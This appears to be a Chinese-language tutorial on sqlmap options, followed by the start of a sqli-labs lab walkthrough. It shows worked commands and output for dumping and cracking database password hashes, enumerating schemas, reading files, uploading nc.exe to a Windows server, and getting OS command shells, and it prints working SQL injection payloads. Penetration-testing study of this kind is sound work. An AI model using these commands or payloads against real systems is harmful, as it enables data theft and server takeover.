+<p><code>-d</code> 是指数据库实例，只能接受以下形式的字符串</p>
+<ul>
+<li><code>DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME</code>（MySQL、Oracle、Microsoft
+SQL Server、PostgreSQL 等）</li>
+<li><code>DBMS://DATABASE_FILEPATH</code>（SQLite、Microsoft
+Access、Firebird 等）</li>
+</ul>
+<p>例如说
+<code>mysql://admin:admin@192.168.21.17:3306/testdb</code>。</p>
+<p><code>-l</code> 是从类似 Burp Suite
+中的<strong>代理日志文件</strong>中解析渗透目标来进行测试和注入，一般用于提供多目标。</p>
+<p><code>-m</code>
+也是用于提供多目标的参数，从类似下文文件中解析多个目标进行自动化渗透</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www.target1.com/vuln1.php?q=foobar</span><br><span class="line">www.target2.com/vuln2.asp?id=1</span><br><span class="line">www.target3.com/vuln3/id/1*</span><br></pre></td></tr></table></figure>
+<p><code>-r</code> 从文本文件中直接载入原始 HTTP
+请求，这样可以简略<strong>请求</strong>设置，例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /vuln.php HTTP/1.1</span><br><span class="line">Host: www.target.com</span><br><span class="line">User-Agent: Mozilla/4.0</span><br><span class="line"></span><br><span class="line">id=1</span><br></pre></td></tr></table></figure>
+<h3 id="请求">请求</h3>
+<p>sqlmap 支持对自动化渗透时的 HTTP 请求进行自定义、随机化设置。</p>
+<p><code>--method</code> 可以指定一些特定的 HTTP 请求方法，例如 RESTful
+的 PUT，即 <code>--method=PUT</code>；</p>
+<p><code>--data</code> 用于传递 POST 请求的数据，例如
+<code>--data="id=1"</code>；</p>
+<p><code>--cookie</code> 用于指定 HTTP 请求携带的 Cookie；</p>
+<blockquote>
+<p><code>--drop-set-cookie</code> 用于忽略自动化渗透时服务端发送的
+<code>Set-Cookie</code> 标头。</p>
+</blockquote>
+<p><code>--user-agent</code> 用于指定 HTTP 请求携带的 User-Agent；</p>
+<blockquote>
+<p><code>--random-agent</code> 用于随机自动化渗透时的 HTTP 请求携带的
+User-Agent，来源是 <code>./data/txt/user-agents.txt</code>。</p>
+<p>如果注入等级 <code>--level</code> 高于等于 3，那么 sqlmap 还会尝试对
+HTTP User-Agent 进行 SQL 注入测试。</p>
+</blockquote>
+<p><code>--host</code> 用于指定 HTTP 请求携带的 Host；</p>
+<blockquote>
+<p>如果注入等级 <code>--level</code> 高于等于 5，那么 sqlmap 还会尝试对
+HTTP Host 进行 SQL 注入测试。</p>
+</blockquote>
+<p><code>--referer</code> 用于指定 HTTP 请求携带的 Referer；</p>
+<blockquote>
+<p>如果注入等级 <code>--level</code> 高于等于 3，那么 sqlmap 还会尝试对
+HTTP Referer 进行 SQL 注入测试。</p>
+</blockquote>
+<p><code>--headers</code> 还可以指定额外的 HTTP 标头，例如
+<code>--headers="X-Forwarded-For: 127.0.0.1"</code>；</p>
+<p>以上设置都可以通过 <code>-r</code>
+参数解决，方便设置。（特殊参数除外）</p>
+<p><code>--proxy</code> 可以指定 sqlmap
+进行自动化渗透时使用的代理，形式为 <code>http://url:port</code>。</p>
+<p><code>--timeout</code> 设置请求超时秒数，可以是浮点数。</p>
+<p><code>--skip-urlencode</code> 有的后端 Web 服务器不遵循 RFC
+标准，可以使用该参数避免 SQL 注入时的 URLEncode。</p>
+<p>许多网站都以令牌的形式纳入反 CSRF
+保护，隐藏字段值在每个页面响应期间随机设置，sqlmap
+将自动尝试识别并绕过这种保护，但有一些选项<code>--csrf-token</code>可<code>--csrf-url</code>用于进一步微调它。</p>
+<p>选项<code>--csrf-token</code>可用于设置包含随机标记的隐藏值的名称。当网站对此类字段使用非标准名称时，这非常有用。选项<code>--csrf-url</code>可用于从任意
+URL 地址检索令牌值。如果易受攻击的目标 URL
+首先不包含必要的令牌值，但需要从其他位置提取它，则这非常有用。</p>
+<p><code>--force-ssl</code> 强制使用 SSL/HTTPS 请求。</p>
+<p><code>--eval</code> 可以写入 Python
+代码便于每次修正请求参数，因为有的请求参数可能是与注入参数强相关的，例如</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot;</span> --<span class="built_in">eval</span>=<span class="string">&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="优化">优化</h3>
+<p><code>--keep-alive</code> 可以使得 sqlmap 使用持久的 HTTP(s)
+连接，提高 IO 次数。</p>
+<p><code>--threads</code> 可以指定并发线程数，可设置的最大并发数为
+10。</p>
+<h3 id="注入">注入</h3>
+<p>sqlmap 可以通过注入参数的设置来微调自动化注入的方式。</p>
+<p><code>-p</code> 用于指定测试参数，比如说针对于 User-Agent
+参数的测试，可以通过 <code>-p "id,user-agent"</code> 来指定测试。</p>
+<p>而高渗透等级可能会测试一些无用参数，也可以通过 <code>--skip</code>
+来跳过测试，例如 <code>--skip  "user-agent,referer"</code>。</p>
+<p>默认情况下，sqlmap
+会根据指纹判断后端的数据库管理系统，但有时会出现不准确的情况，可以使用
+<code>--dbms</code> 强制指定对应的数据库管理系统。</p>
+<p>同样的对于数据库管理系统的操作系统也是如此，可以使用
+<code>--os</code> 强制指定。</p>
+<p><code>--tamper</code>
+可以指定一些额外的插件脚本来混淆注入语句，可以使用 <code>,</code>
+连接多个 tamper 。</p>
+<p>通过 <code>sqlmap --list-tampers</code> 可以列出所有 tamper
+及其作用。</p>
+<h3 id="检测">检测</h3>
+<p><code>--level</code> 可以指定自动化渗透等级。SQL
+注入方式越复杂那么渗透等级越高。</p>
+<p><code>--risk</code> 可以指定自动化渗透风险等级。有的 SQL
+注入方式可能会导致服务出现异常，例如 <code>UPDATE</code>
+语句注入可能会修改某些条目，如果在希望注入成功率增加的同时能忍受一定的风险，那么可以适当提高风险等级。</p>
+<h3 id="技术">技术</h3>
+<p><code>--technique</code> 可以指定自动化渗透所使用的 SQL
+注入技术，可以是一个或多个字符的组合，每个字符的含义如下</p>
+<ul>
+<li><code>B</code>：基于布尔的盲注</li>
+<li><code>E</code>：基于错误</li>
+<li><code>U</code>：基于联合查询</li>
+<li><code>S</code>：堆叠查询</li>
+<li><code>T</code>：基于时间的盲注</li>
+<li><code>Q</code>：内联查询</li>
+</ul>
+<p>默认值为 <code>BEUSTQ</code>，即
+<code>--technique=BEUSTQ</code>。</p>
+<p><code>--time-sec</code> 可以改变时间盲注的延时时间，默认值为 5
+秒。时间降低可能会导致准确率降低，时间增加可能会导致攻击的时间成本过高。</p>
+<p><code>--union-cols</code> 可以改变 UNION 注入的列数，因为 sqlmap
+默认只在 1~10 列进行测试，如果需要更高范围的测试可以使用该参数。</p>
+<p>在某些 UNION 查询 SQL
+注入情况下，需要强制在<code>FROM</code>子句中使用有效且可访问的表名。例如，Microsoft
+Access 需要使用此类表。如果不提供一个 UNION 查询，SQL
+注入将无法正确执行（例如<code>--union-from=users</code>）。</p>
+<p>二次注入需要使用参数 <code>--second-url</code> 或
+<code>--second-req</code> 指定。</p>
+<h3 id="指纹">指纹</h3>
+<p>sqlmap
+会自动根据指纹来识别对应的数据库管理系统，可以通过<code>-f</code> 或
+<code>--fingerprint</code> 来进行自动化识别， <code>-b</code> 或
+<code>--banner</code>
+参数可以提供更精确的结果（后者的前提是可注入）。</p>
+<h3 id="枚举">枚举</h3>
+<p>枚举选项可以让 sqlmap
+枚举后端数据库管理系统的信息、结构和表中包含的数据，甚至可以允许自己的
+SQL 语句。</p>
+<p><code>-b</code> 或 <code>--banner</code>
+参数可以提供更精确的数据库版本结果，原理是注入 <code>version</code>
+函数。</p>
+<p><code>--current-user</code>
+可以检索数据库管理系统当前执行查询的用户。</p>
+<p><code>--current-db</code> 可以检索当前数据库名称。</p>
+<p><code>--hostname</code> 可以检索服务端主机名。</p>
+<p><code>--is-dba</code> 可以检测当前数据库用户是否为管理员用户。</p>
+<p><code>--users</code> 可以检索出所有数据库用户。</p>
+<p><code>--passwords</code>
+可以列出并自动化破解数据库管理系统用户密码的哈希值。</p>
+<p>针对 PostgreSQL 目标的示例：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">&quot;http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot;</span> --passwords -v 1</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">back-end DBMS: PostgreSQL</span><br><span class="line">[hh:mm:38] [INFO] fetching database <span class="built_in">users</span> password hashes</span><br><span class="line"><span class="keyword">do</span> you want to use dictionary attack on retrieved password hashes? [Y/n/q] y</span><br><span class="line">[hh:mm:42] [INFO] using <span class="built_in">hash</span> method: <span class="string">&#x27;postgres_passwd&#x27;</span></span><br><span class="line">what<span class="string">&#x27;s the dictionary&#x27;</span>s location? [/software/sqlmap/txt/wordlist.txt] </span><br><span class="line">[hh:mm:46] [INFO] loading dictionary from: <span class="string">&#x27;/software/sqlmap/txt/wordlist.txt&#x27;</span></span><br><span class="line"><span class="keyword">do</span> you want to use common password suffixes? (slow!) [y/N] n</span><br><span class="line">[hh:mm:48] [INFO] starting dictionary attack (postgres_passwd)</span><br><span class="line">[hh:mm:49] [INFO] found: <span class="string">&#x27;testpass&#x27;</span> <span class="keyword">for</span> user: <span class="string">&#x27;testuser&#x27;</span></span><br><span class="line">[hh:mm:50] [INFO] found: <span class="string">&#x27;testpass&#x27;</span> <span class="keyword">for</span> user: <span class="string">&#x27;postgres&#x27;</span></span><br><span class="line">database management system <span class="built_in">users</span> password hashes:</span><br><span class="line">[*] postgres [1]:</span><br><span class="line">    password <span class="built_in">hash</span>: md5d7d880f96044b72d0bba108ace96d1e4</span><br><span class="line">    clear-text password: testpass</span><br><span class="line">[*] testuser [1]:</span><br><span class="line">    password <span class="built_in">hash</span>: md599e5ea7a6f7c3269995cba3927fd0093</span><br><span class="line">    clear-text password: testpass</span><br></pre></td></tr></table></figure>
+<p>sqlmap 不仅枚举了 DBMS 用户及其密码，而且还识别出 PostgreSQL
+的哈希格式，询问用户是否针对字典文件测试哈希值，并识别用户的明文密码<code>postgres</code>，通常是DBA
+以及其他用户、<code>testuser</code>密码。</p>
+<p>此功能已在所有可以枚举用户密码散列的 DBMS 中实现，包括 2005 年前后的
+Oracle 和 Microsoft SQL Server。</p>
+<p>您还可以提供选项 <code>-U</code>
+来指定要枚举并最终破解密码哈希的特定用户。如果您提供<code>CU</code>用户名，它会将其视为当前用户的别名，并检索该用户的密码哈希。</p>
+<p><code>--privileges</code> 可以检索当前数据库用户权限，也可以通过
+<code>-U</code> 指定特定用户。</p>
+<p><code>--dbs</code> 可以检索出所有数据库。</p>
+<p><code>--tables</code>
+可以检索出数据库中的所有表（table），如果没有使用 <code>-D</code>
+指定数据库名字，那么将列出所有，<code>--exclude-sysdbs</code>
+可以排除所有系统数据库的表。</p>
+<p><code>--columns</code> 可以检索出表中所有的列（column），如果没有使用
+<code>-D</code> 指定数据库名，没有使用 <code>-T</code>
+指定表名，那么将列出所有（或相匹配的）。</p>
+<p><code>--schema</code>
+可以检索所有数据库、表和列及其各自的类型并一起展示，使用
+<code>--exclude-sysdbs</code> 忽略系统数据库。</p>
+<p>针对 MySQL 目标的示例：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">&quot;http://192.168.48.130/sqlmap/mysql/get_int.php?id=1&quot;</span> --schema--batch --exclude-sysdbs</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">Database: owasp10</span><br><span class="line">Table: accounts</span><br><span class="line">[4 columns]</span><br><span class="line">+-------------+---------+</span><br><span class="line">| Column      | Type    |</span><br><span class="line">+-------------+---------+</span><br><span class="line">| cid         | int(11) |</span><br><span class="line">| mysignature | text    |</span><br><span class="line">| password    | text    |</span><br><span class="line">| username    | text    |</span><br><span class="line">+-------------+---------+</span><br><span class="line"></span><br><span class="line">Database: owasp10</span><br><span class="line">Table: blogs_table</span><br><span class="line">[4 columns]</span><br><span class="line">+--------------+----------+</span><br><span class="line">| Column       | Type     |</span><br><span class="line">+--------------+----------+</span><br><span class="line">| <span class="built_in">date</span>         | datetime |</span><br><span class="line">| blogger_name | text     |</span><br><span class="line">| cid          | int(11)  |</span><br><span class="line">| comment      | text     |</span><br><span class="line">+--------------+----------+</span><br><span class="line"></span><br><span class="line">Database: owasp10</span><br><span class="line">Table: hitlog</span><br><span class="line">[6 columns]</span><br><span class="line">+----------+----------+</span><br><span class="line">| Column   | Type     |</span><br><span class="line">+----------+----------+</span><br><span class="line">| <span class="built_in">date</span>     | datetime |</span><br><span class="line">| browser  | text     |</span><br><span class="line">| cid      | int(11)  |</span><br><span class="line">| hostname | text     |</span><br><span class="line">| ip       | text     |</span><br><span class="line">| referer  | text     |</span><br><span class="line">+----------+----------+</span><br><span class="line"></span><br><span class="line">Database: testdb</span><br><span class="line">Table: <span class="built_in">users</span></span><br><span class="line">[3 columns]</span><br><span class="line">+---------+---------------+</span><br><span class="line">| Column  | Type          |</span><br><span class="line">+---------+---------------+</span><br><span class="line">| <span class="built_in">id</span>      | int(11)       |</span><br><span class="line">| name    | varchar(500)  |</span><br><span class="line">| surname | varchar(1000) |</span><br><span class="line">+---------+---------------+</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+<p><code>--dump</code>
+可以转储指定数据库（<code>-D</code>），指定表（<code>-T</code>）的内容，还有更多参数具体可以查看帮助信息。</p>
+<p><code>--dump-all</code> 可以一次性转出整个数据库。</p>
+<p><code>--sql-query</code> 和 <code>--sql-shell</code> 可以运行任意 SQL
+语句，还可以启动 sql shell 的模式。</p>
+<h3 id="爆破">爆破</h3>
+<p>在某些情况下，switch<code>--tables</code>不能用于检索数据库的表名。这些案例通常属于以下类别之一：</p>
+<ul>
+<li>数据库管理系统是 MySQL &lt;
+5.0，<code>information_schema</code>不可用。</li>
+<li>数据库管理系统是 Microsoft
+Access，系统表<code>MSysObjects</code>不可读 - 默认设置。</li>
+<li>会话用户没有对存储数据库方案的系统表的读取权限。</li>
+</ul>
+<p>那么可以尝试使用 <code>--common-tables</code>
+来进行一定的暴力攻击以检测数据库中是否存在某些常见的表（名）。</p>
+<blockquote>
+<p>参数来自于
+<code>data/txt/common-tables.txt</code>，可以自行向该字典中添加新的值。</p>
+</blockquote>
+<p>同理，<code>--columns</code> 也可能无法使用，使用
+<code>--common-columns</code> 也可以进行一定的暴力攻击。</p>
+<blockquote>
+<p>参数来自于
+<code>data/txt/common-columns.txt</code>，可以自行向该字典中添加新的值。</p>
+</blockquote>
+<h3 id="任意文件读写">任意文件读写</h3>
+<p>某些版本下的数据库管理系统可能存在权限缺陷，可以访问、读取、写入服务器中指定文件。</p>
+<p><code>--file-read</code> 可以指定一个路径进行读取，针对 Microsoft SQL
+Server 2005 目标检索二进制文件的示例：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">&quot;http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther&quot;</span> --file-read <span class="string">&quot;C:/example.exe&quot;</span> -v 1</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">[hh:mm:49] [INFO] the back-end DBMS is Microsoft SQL Server</span><br><span class="line">web server operating system: Windows 2000</span><br><span class="line">web application technology: ASP.NET, Microsoft IIS 6.0, ASP</span><br><span class="line">back-end DBMS: Microsoft SQL Server 2005</span><br><span class="line"></span><br><span class="line">[hh:mm:50] [INFO] fetching file: <span class="string">&#x27;C:/example.exe&#x27;</span></span><br><span class="line">[hh:mm:50] [INFO] the SQL query provided returns 3 entries</span><br><span class="line">C:/example.exe file saved to:    <span class="string">&#x27;/software/sqlmap/output/192.168.136.129/files/</span></span><br><span class="line"><span class="string">C__example.exe&#x27;</span></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span> -l output/192.168.136.129/files/C__example.exe </span><br><span class="line">-rw-r--r-- 1 inquis inquis 2560 2011-MM-DD hh:mm output/192.168.136.129/files/C_</span><br><span class="line">_example.exe</span><br><span class="line"></span><br><span class="line">$ file output/192.168.136.129/files/C__example.exe output/192.168.136.129/files/C__example.exe: PE32 executable <span class="keyword">for</span> MS Windows (GUI</span><br><span class="line">) Intel 80386 32-bit</span><br></pre></td></tr></table></figure>
+<p><code>--file-write</code> 和 <code>--file-dest</code>
+可以写入文件，前者指定本地文件路径，后者指定服务器路径。</p>
+<p>针对 MySQL 目标上传二进制 UPX 压缩文件的示例：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ file /software/nc.exe.packed </span><br><span class="line">/software/nc.exe.packed: PE32 executable <span class="keyword">for</span> MS Windows (console) Intel 80386 32</span><br><span class="line">-bit</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span> -l /software/nc.exe.packed</span><br><span class="line">-rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed</span><br><span class="line"></span><br><span class="line">$ python sqlmap.py -u <span class="string">&quot;http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1&quot;</span> --file-write <span class="string">&quot;/software/nc.exe.packed&quot;</span> --file-dest <span class="string">&quot;C:/WINDOWS/Temp/nc.exe&quot;</span> -v 1</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">[hh:mm:29] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Windows 2003 or 2008</span><br><span class="line">web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.0</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"><span class="keyword">do</span> you want confirmation that the file <span class="string">&#x27;C:/WINDOWS/Temp/nc.exe&#x27;</span> has been success</span><br><span class="line">fully written on the back-end DBMS file system? [Y/n] y</span><br><span class="line">[hh:mm:52] [INFO] retrieved: 31744</span><br><span class="line">[hh:mm:52] [INFO] the file has been successfully written and its size is 31744 b</span><br><span class="line">ytes, same size as the <span class="built_in">local</span> file <span class="string">&#x27;/software/nc.exe.packed&#x27;</span></span><br></pre></td></tr></table></figure>
+<h3 id="命令执行">命令执行</h3>
+<p>某些版本下的数据库管理系统可能存在权限缺陷，可以在<strong>数据库服务器的底层操作系统上运行任意命令</strong>。</p>
+<p><code>--os-cmd</code> 接管 Windows
+系统的命令执行，<code>--os-shell</code> 接管 Linux 系统的命令执行。</p>
+<p>甚至可以通过一些 PWN 攻击手段进行命令执行。</p>
+<h3 id="注册表访问">注册表访问</h3>
+<p>具体查看帮助：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Windows registry access:</span><br><span class="line">  These options can be used to access the back-end database management</span><br><span class="line">  system Windows registry</span><br><span class="line"></span><br><span class="line">  --reg-read          Read a Windows registry key value</span><br><span class="line">  --reg-add           Write a Windows registry key value data</span><br><span class="line">  --reg-del           Delete a Windows registry key value</span><br><span class="line">  --reg-key=REGKEY    Windows registry key</span><br><span class="line">  --reg-value=REGVAL  Windows registry key value</span><br><span class="line">  --reg-data=REGDATA  Windows registry key value data</span><br><span class="line">  --reg-type=REGTYPE  Windows registry key value type</span><br></pre></td></tr></table></figure>
+<h3 id="常规选项">常规选项</h3>
+<p>sqlmap 自动为每个目标在专用输出目录中创建一个持久会话 SQLite
+文件，其中存储会话恢复所需的所有数据。如果用户想要显式设置会话文件位置（例如，将多个目标的会话数据存储在一个位置），可以使用
+<code>-s</code> 指定路径。</p>
+<p><code>-t</code> 可以指定一个文本文件来输出 HTTP 流量日志。</p>
+<p>如果参数传递需要进行 base64 编码，可以使用 <code>--base64</code>
+指定参数名。</p>
+<p>使用示例（注：<code>Base64('&#123;"id": 1&#125;') == 'eyJpZCI6IDF9'</code>）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u http://192.168.22.128/sqlmap/mysql/get_base64?value=eyJpZCI6IDF9 -v 5 --<span class="built_in">base64</span>=value</span><br><span class="line">[...]</span><br><span class="line">[23:43:35] [INFO] testing <span class="string">&#x27;Boolean-based blind - Parameter replace (original valu</span></span><br><span class="line"><span class="string">e)&#x27;</span></span><br><span class="line">[23:43:35] [PAYLOAD] KFNFTEVDVCAoQ0FTRSBXSEVOICgzODY1PTUzMTQpIFRIRU4gJ3siaWQiOiAx</span><br><span class="line">fScgRUxTRSAoU0VMRUNUIDUzMTQgVU5JT04gU0VMRUNUIDE5MzIpIEVORCkp</span><br><span class="line">[23:43:35] [TRAFFIC OUT] HTTP request [<span class="comment">#11]:</span></span><br><span class="line">GET /?value=KFNFTEVDVCAoQ0FTRSBXSEVOICgzODY1PTUzMTQpIFRIRU4gJ3siaWQiOiAxfScgRUxTR</span><br><span class="line">SAoU0VMRUNUIDUzMTQgVU5JT04gU0VMRUNUIDE5MzIpIEVORCkp HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Cache-control: no-cache</span><br><span class="line">Accept-encoding: gzip,deflate</span><br><span class="line">Accept: */*</span><br><span class="line">User-agent: sqlmap/1.4.4.3<span class="comment">#dev (http://sqlmap.org)</span></span><br><span class="line">Connection: close</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+<p><code>--charset</code>
+可以强制盲注字符集，一般是为了减少字符集大小来加快数据检索，例如
+<code>--charset="0123456789abcdef"</code> 预期请求数量比常规运行少大约
+30%。</p>
+<p><code>--crawl</code> 会自动爬取目标 URL
+下的子网页并进行渗透测试，需要指定一个爬取深度，例如
+<code>--crawl=3</code>。</p>
+<p><code>--hex</code> 会强制使用十六进制函数进行攻击。</p>
+<p><code>--output-dir</code> 可以指定输出目录，否则会在默认 Temp
+目录中输出。</p>
+<p><code>--alert</code> 检测到成功注入后会发出警报，<code>--beep</code>
+会发出蜂鸣声。</p>
+<p>针对于某些特定的手机 APP 后端，可能会约束使用手机 UA
+进行请求，可以使用 <code>--mobile</code> 进行指定。</p>
+<p><code>--flush-session</code> 可以强制刷新 sqlmap 的缓存，因为 sqlmap
+上一次攻击的方法针对 <code>version</code> 可以成功，但不代表其针对
+<code>--dbs</code> 也可以成功，所以需要强制刷新缓存。</p>
+<h2 id="sqli-labs">sqli-labs</h2>
+<p>使用 docker 镜像 <code>c0ny1/sqli-labs</code> 进行渗透学习。</p>
+<p>使用 sqlmap 进行自动化渗透，目标一般定为将数据库转储即完成渗透。</p>
+<h3 id="less-1">Less-1</h3>
+<p>基于错误的注入，GET 单引号字符型注入。</p>
+<p>第一步，使用 <code>-f</code> 参数初步注入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://qsdz.vm.szu.moe:8888/Less-1/?id=1&quot;</span> -f</span><br></pre></td></tr></table></figure>
+<p>可以得到回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id=1&#x27; AND 3288=3288 AND &#x27;qHrh&#x27;=&#x27;qHrh</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)</span><br><span class="line">    Payload: id=1&#x27; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7671,(SELECT (ELT(2521=2521,1))),0x7171716271,0x78))s), 8446744073709551610, 8446744073709551610))) AND &#x27;oFyO&#x27;=&#x27;oFyO</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id=1&#x27; AND (SELECT 7806 FROM (SELECT(SLEEP(5)))cxke) AND &#x27;APfo&#x27;=&#x27;APfo</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: id=-6679&#x27; UNION ALL SELECT NULL,CONCAT(0x71786a7671,0x6855526b4258536d4d4649567a424e6b5952675a46626c6a4f6c5257756642444f73756467744441,0x7171716271),NULL-- -</span><br><span class="line">---</span><br><span class="line">web server operating system: Linux Ubuntu</span><br><span class="line">web application technology: PHP 5.5.9, Apache 2.4.7</span><br><span class="line">back-end DBMS: active fingerprint: MySQL &gt;= 5.5</span><br><span class="line">               comment injection fingerprint: MySQL 5.5.47</span><br><span class="line">               html error message fingerprint: MySQL</span><br></pre></td></tr></table></figure>
+<p>其中很快速地探测出一定的注入方式和服务端的一些信息。</p>
+<p>不妨使用 <code>-b</code> 获取 <code>version</code> 信息，回显如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">web server operating system: Linux Ubuntu</span><br><span class="line">web application technology: PHP 5.5.9, Apache 2.4.7</span><br><span class="line">back-end DBMS operating system: Linux Ubuntu</span><br><span class="line">back-end DBMS: MySQL 5</span><br><span class="line">banner: &#x27;5.5.47-0ubuntu0.14.04.1&#x27;</span><br></pre></td></tr></table></figure>
+<p>与 <code>-f</code> 的推测基本一致。（<code>banner</code>
+需要成功注入获取 <code>version</code> 函数的信息，而
+<code>fingerprint</code> 不需要）</p>
